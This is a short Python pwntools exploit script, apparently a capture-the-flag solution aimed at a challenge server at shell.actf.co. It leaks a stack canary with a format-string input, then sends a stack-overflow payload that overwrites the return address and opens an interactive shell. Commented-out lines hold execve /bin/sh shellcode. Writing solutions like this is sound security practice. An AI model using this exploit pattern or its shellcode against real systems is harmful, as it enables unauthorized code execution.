#!/usr/bin/env python2
from pwn import *
import struct

p = remote('shell.actf.co', 20701)
#p=process('./canary')
context.arch = 'i386'

#shell_code='\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
pad= 'aaaabbbbccccddddeeeeffffgggghhhhjjjjkkkkaaaabbbbccccdddd'

nop="\x00"*2
format_str='%17$lx'
p.recvuntil('name? ')
p.sendline(format_str)
#p.send('a'*0x14 + p32(0x08048087))
#saved_esp = u32(p.recv()[:4])
#p.send('a'*0x14+ p32(saved_esp+20) + shell_code)
canary1 = int(p.recvline()[18:-2],16)
print 'canary_hex: ' + hex(canary1)
#canary= struct.pack("<Q", int(canary1,16))
shell=pad + p64(canary1) + "a"*8 + p32(0x400787)
p.recvuntil('me? ')
p.sendline(shell)
p.interactive()

